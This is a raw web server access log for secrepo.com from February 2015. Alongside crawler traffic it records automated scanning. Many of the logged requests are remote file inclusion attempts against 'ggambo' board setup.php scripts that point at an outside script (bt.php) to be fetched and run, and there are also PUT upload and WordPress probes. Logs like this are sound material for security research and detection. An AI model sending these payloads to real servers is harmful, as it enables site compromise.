198.204.252.211 - - [10/Feb/2015:04:36:51 -0800] "GET /honeypot/BSidesDFW+-+2014.ipynb HTTP/1.0" 404 284 "http://www.secrepo.com/honeypot/BSidesDFW+-+2014.ipynb" "Mozilla/5.0 (Windows NT 5.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" 
198.204.252.211 - - [10/Feb/2015:04:36:52 -0800] "GET / HTTP/1.0" 200 21960 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 5.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" 
66.249.69.11 - - [10/Feb/2015:04:40:02 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
70.114.252.5 - - [10/Feb/2015:04:40:28 -0800] "GET / HTTP/1.1" 304 189 "http://t.co/Qro1LCR4GM" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2292.0 Safari/537.36" 
104.130.161.117 - - [10/Feb/2015:05:14:18 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.117 - - [10/Feb/2015:05:14:19 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
212.131.240.154 - - [10/Feb/2015:05:18:42 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
212.131.240.154 - - [10/Feb/2015:05:18:43 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 206 634 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
104.155.21.163 - - [10/Feb/2015:05:24:46 -0800] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
104.155.21.163 - - [10/Feb/2015:05:25:00 -0800] "GET /honeypot//%22http://amunhoney.sourceforge.net//%22 HTTP/1.0" 404 284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
104.155.21.163 - - [10/Feb/2015:05:25:07 -0800] "GET /honeypot//%22http://glastopf.org//%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
104.155.21.163 - - [10/Feb/2015:05:25:12 -0800] "GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
104.155.21.163 - - [10/Feb/2015:05:25:35 -0800] "GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
104.155.21.163 - - [10/Feb/2015:05:25:40 -0800] "GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
162.242.223.78 - - [10/Feb/2015:05:47:27 -0800] "GET //index.php HTTP/1.1" 404 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko)" 
162.242.223.78 - - [10/Feb/2015:05:47:27 -0800] "POST //wp-admin/admin-ajax.php HTTP/1.1" 404 264 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko)" 
162.242.223.78 - - [10/Feb/2015:05:47:27 -0800] "POST //wp-admin/admin-ajax.php HTTP/1.1" 404 264 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko)" 
162.242.223.78 - - [10/Feb/2015:05:47:28 -0800] "PUT /nyet.gif HTTP/1.1" 405 461 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-LI; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729)" 
162.242.223.78 - - [10/Feb/2015:05:47:28 -0800] "GET /nyet.gif HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)" 
123.125.71.84 - - [10/Feb/2015:05:59:41 -0800] "GET / HTTP/1.1" 200 21960 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.165 - - [10/Feb/2015:06:00:03 -0800] "GET / HTTP/1.1" 200 21960 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
187.14.4.85 - - [10/Feb/2015:06:22:39 -0800] "GET / HTTP/1.1" 301 483 "http://semalt.semalt.com/crawler.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
187.14.4.85 - - [10/Feb/2015:06:22:41 -0800] "GET / HTTP/1.1" 200 6788 "http://semalt.semalt.com/crawler.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
187.14.4.85 - - [10/Feb/2015:06:22:41 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
112.218.68.155 - - [10/Feb/2015:08:15:17 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [10/Feb/2015:08:15:19 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [10/Feb/2015:08:15:19 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [10/Feb/2015:08:15:19 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [10/Feb/2015:08:15:20 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [10/Feb/2015:08:15:21 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [10/Feb/2015:08:15:22 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [10/Feb/2015:08:15:22 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
94.246.128.46 - - [10/Feb/2015:08:15:23 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:15:24 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:15:24 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:15:26 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:15:26 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:15:27 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:15:27 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:15:29 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
1.224.163.80 - - [10/Feb/2015:08:16:03 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:03 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
1.224.163.80 - - [10/Feb/2015:08:16:04 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:05 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:05 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
1.224.163.80 - - [10/Feb/2015:08:16:06 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:09 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
1.224.163.80 - - [10/Feb/2015:08:16:11 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
1.224.163.80 - - [10/Feb/2015:08:16:13 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:15 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:15 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:16 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:17 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:18 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:19 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:16:20 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:17:24 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
112.218.68.155 - - [10/Feb/2015:08:17:25 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
1.224.163.80 - - [10/Feb/2015:08:17:25 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:17:26 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
112.218.68.155 - - [10/Feb/2015:08:17:26 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
1.224.163.80 - - [10/Feb/2015:08:17:27 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:17:35 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:08:17:36 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:08:17:37 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:08:17:38 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:08:18:00 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:08:18:02 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:08:18:03 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:08:18:04 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
94.246.128.46 - - [10/Feb/2015:08:19:07 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:19:08 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:19:08 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:19:09 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:19:09 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:19:09 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:19:10 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:19:11 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
95.168.199.227 - - [10/Feb/2015:08:21:36 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:21:38 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:21:38 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:21:39 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:21:50 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:08:21:50 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:08:21:51 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:08:21:51 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:08:21:51 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:08:21:51 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:08:21:52 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:08:21:52 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:08:21:55 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:21:57 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:21:57 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:21:58 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:22:15 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
95.168.199.227 - - [10/Feb/2015:08:22:16 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
95.168.199.227 - - [10/Feb/2015:08:22:16 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
95.168.199.227 - - [10/Feb/2015:08:22:18 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
95.168.199.227 - - [10/Feb/2015:08:22:26 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
112.218.68.155 - - [10/Feb/2015:08:22:27 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
95.168.199.227 - - [10/Feb/2015:08:22:28 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:22:28 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
112.218.68.155 - - [10/Feb/2015:08:22:29 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
95.168.199.227 - - [10/Feb/2015:08:22:29 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
112.218.68.155 - - [10/Feb/2015:08:22:30 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [10/Feb/2015:08:22:31 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
1.224.163.80 - - [10/Feb/2015:08:22:49 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:22:50 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:22:50 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:22:52 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
95.168.199.227 - - [10/Feb/2015:08:22:53 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:22:55 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:22:55 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:22:56 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
1.224.163.80 - - [10/Feb/2015:08:22:57 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:22:58 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
